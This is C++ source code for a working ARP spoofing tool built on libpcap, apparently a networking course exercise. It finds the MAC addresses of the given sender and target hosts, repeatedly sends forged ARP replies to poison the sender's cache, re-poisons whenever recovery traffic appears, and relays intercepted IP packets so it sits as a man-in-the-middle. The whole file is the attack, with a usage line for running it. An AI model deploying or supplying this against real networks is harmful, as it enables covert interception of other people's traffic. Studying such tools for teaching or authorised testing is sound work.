#include <cstdio>
#include <pcap.h>
#include <vector>
#include <set>
#include <chrono>
#include <thread>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

Ip dev_IP;
Mac dev_MAC;
std::vector<uint32_t> senderIp;
std::vector<uint32_t> targetIp;
std::set<uint32_t> Ip_set;
std::vector<uint32_t> Ip_vec;
std::vector<Mac> Mac_vec;
pcap_t* handle;
pthread_mutex_t mutex;
uint32_t flowlen;

uint32_t parseIp(const char* str) {
	uint8_t temp[4];
	int res = sscanf(str, "%hhu.%hhu.%hhu.%hhu", temp+3, temp+2, temp+1, temp);
	if (res != 4) {
		fprintf(stderr, "parseIp sscanf return %d r=%s\n", res, str);
		exit(-1);
	}
	return *(uint32_t*)temp;
}


void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

void sendpacket(pcap_t* handle,Mac eth_dmac,Mac eth_smac,Mac arp_smac,Ip arp_sip,Mac arp_tmac,Ip arp_tip,uint16_t op) {
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);
	pthread_mutex_lock(&mutex);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	pthread_mutex_unlock(&mutex);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void recvpacket(pcap_t* handle,pcap_pkthdr** pheader,const EthArpPacket** pppacket) {//copied from pcap-test.c
	int res = pcap_next_ex(handle, pheader, reinterpret_cast<const u_char**>(pppacket));
	if (res == 0) return;
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		exit(-1);
	}
}

void *send_where_req(void* iter) 
{
	Ip tip=Ip(*(uint32_t*)iter);
	while(1)
	{
		//pthread_mutex_lock(&mutex);
		sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),tip,ArpHdr::Request);
		//pthread_mutex_unlock(&mutex);
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void *infect(void*)
{
	while(1)
	{
		printf("infectall\n");
		for(int i=0;i<flowlen;i++)
		{
			Ip sip=Ip(Ip_vec[senderIp[i]]);
			Ip tip=Ip(Ip_vec[targetIp[i]]);
			Mac smac=Mac_vec[senderIp[i]];
			//Mac tmac=Mac_vec[targetIp[i]];
			//printf("%d %d\n",senderIp[i],targetIp[i]);
			sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void *wait_and_reply(void* iter) 
{
	uint32_t i=*(uint32_t*)iter;
	std::this_thread::sleep_for(std::chrono::milliseconds(100));
	Ip sip=Ip(Ip_vec[senderIp[i]]);
	Ip tip=Ip(Ip_vec[targetIp[i]]);
	Mac smac=Mac_vec[senderIp[i]];
	//pthread_mutex_lock(&mutex);
	sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
	//pthread_mutex_unlock(&mutex);
	delete (uint32_t*)iter;
	return NULL;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc&1 ) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	//get addresses 
	pcap_if_t* devp;
	if(pcap_findalldevs(&devp,errbuf)){
		fprintf(stderr, "couldn't find all device(%s)\n",errbuf); 
	}
	while(devp) {
		if(strcmp(dev,devp->name)==0)
			break;
		devp=devp->next;
	}
	//get MAC
	pcap_addr_t* dev_addr=devp->addresses;
	while(dev_addr&&dev_addr->addr->sa_family!=AF_PACKET) {
		dev_addr=dev_addr->next;
	}
	if(!dev_addr) {
		fprintf(stderr, "couldn't find MAC address\n");
		return -1;
	}
	dev_MAC=Mac((const uint8_t*)(dev_addr->addr->sa_data+10));//sockaddr_ll.sll_addr
	//get IP
	dev_addr=devp->addresses;
	while(dev_addr&&dev_addr->addr->sa_family!=AF_INET) {
		dev_addr=dev_addr->next;
	}
	if(!dev_addr) {
		fprintf(stderr, "couldn't find IP address\n");
		return -1;
	}
	dev_IP=Ip(ntohl(*(uint32_t*)&((sockaddr_in*)(dev_addr->addr))->sin_addr));//casting and ntohl
	pcap_pkthdr* header;
	const EthArpPacket* ppacket;
	
	
	
	uint32_t t;
	for(int i=2;i<argc;i+=2)
	{
		t=parseIp(argv[i]);
		senderIp.push_back(t);
		Ip_set.insert(t);
		t=parseIp(argv[i+1]);
		targetIp.push_back(t);
		Ip_set.insert(t);
	}
	flowlen=senderIp.size();
	for(int i=0;i<flowlen;i++)
	{
		senderIp[i]=std::distance(Ip_set.begin(), Ip_set.find(senderIp[i]));
		targetIp[i]=std::distance(Ip_set.begin(), Ip_set.find(targetIp[i]));
		//printf("%d %d\n",senderIp[i],targetIp[i]);
	}
	for (std::set<uint32_t>::iterator iter = Ip_set.begin(); iter != Ip_set.end(); iter++)
	{
		//printf("%s\n",((std::string)Ip(*iter)).data());
		//sendpacket(handle,Mac::broadcastMac(),dev_MAC,dev_MAC,dev_IP,Mac::nullMac(),senderIp,ArpHdr::Request);
		pthread_t send_thread;
		int xx=*iter;
		if(pthread_create(&send_thread, NULL, send_where_req,(void*)&xx)) {
        	fprintf(stderr, "Error while creating thread\n");
			return -1;
		}
		while(1)
		{
			recvpacket(handle,&header,&ppacket);
			//Mac senderMac=ppacket->arp_.smac_;
			if(ntohl(ppacket->arp_.sip_)!=*iter)continue;
			if(ntohl(ppacket->arp_.tip_)!=(uint32_t)dev_IP)continue;
			if(ntohs(ppacket->arp_.op_)!=ArpHdr::Reply)continue;
			//printf("%s\n",((std::string)ppacket->arp_.smac_).data());
			Mac_vec.push_back(ppacket->arp_.smac_);
			break;
		}
		pthread_cancel(send_thread);
	}
	uint32_t maclen=Mac_vec.size();	
	std::copy(Ip_set.begin(),Ip_set.end(),std::back_inserter(Ip_vec));
	/*
	for(int i=0;i<maclen;i++){
		printf("%s\n",((std::string)Mac_vec[i]).data());
	}
	*/
	/*
	for(int i=0;i<flowlen;i++)
	{
		Ip sip=Ip(Ip_vec[senderIp[i]]);
		Ip tip=Ip(Ip_vec[targetIp[i]]);
		Mac smac=Mac_vec[senderIp[i]];
		//Mac tmac=Mac_vec[targetIp[i]];
		//printf("%d %d\n",senderIp[i],targetIp[i]);
		sendpacket(handle,smac,dev_MAC,dev_MAC,tip,smac,sip,ArpHdr::Reply);
	}
	*/
	pthread_t infect_thread;
	if(pthread_create(&infect_thread, NULL, infect,NULL)) {
    	fprintf(stderr, "Error while creating thread\n");
		return -1;
	}
	const u_char* packet_data;
	while(1)
	{
		int res = pcap_next_ex(handle, &header, &packet_data);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr,"pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}
		//printf("%u bytes captured\n", header->caplen);
		uint16_t type=((EthHdr*)packet_data)->type();
		if(type==EthHdr::Ip4)
		{
			uint32_t psip=ntohl(*(uint32_t*)(packet_data+0x1a));
			uint32_t ptip=ntohl(*(uint32_t*)(packet_data+0x1e));
			for(int i=0;i<flowlen;i++)
			{
				if(Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]!=dev_IP)
				{
					u_char* copy_packet_data=(u_char*)malloc(header->caplen);
					memcpy(copy_packet_data,packet_data,header->caplen);
					((EthHdr*)copy_packet_data)->smac_=dev_MAC;
					((EthHdr*)copy_packet_data)->dmac_=Mac_vec[targetIp[i]];
					pthread_mutex_lock(&mutex);
					pcap_sendpacket(handle,copy_packet_data, header->caplen);
					pthread_mutex_unlock(&mutex);
					free(copy_packet_data);
					printf("relay %d\n",i);
				}
			}
		}
		if(type==EthHdr::Arp)
		{
			uint32_t psip=ntohl(((EthArpPacket*)packet_data)->arp_.sip_);
			uint32_t ptip=ntohl(((EthArpPacket*)packet_data)->arp_.tip_);
			Mac ptmac=((EthArpPacket*)packet_data)->arp_.tmac_;
			for(int i=0;i<flowlen;i++)
			{
				bool check=false;
				check|=Ip_vec[senderIp[i]]==psip&&Ip_vec[targetIp[i]]==ptip;
				check|=Ip_vec[senderIp[i]]==ptip&&Ip_vec[targetIp[i]]==psip;
				check|=Mac::nullMac()==ptmac&&Ip_vec[targetIp[i]]==psip;
				if(check)
				{
					printf("posion %d\n",i);
					Ip sip=Ip(Ip_vec[senderIp[i]]);
					Ip tip=Ip(Ip_vec[targetIp[i]]);
					Mac smac=Mac_vec[senderIp[i]];
					pthread_t send_thread;
					uint32_t *x=new uint32_t;
					*x=i;
					if(pthread_create(&send_thread, NULL, wait_and_reply,(void*)x)) {
						fprintf(stderr, "Error while creating thread\n");
						return -1;
					}
				}
			}
		}
	}
	pthread_cancel(infect_thread);
	pcap_close(handle);
}
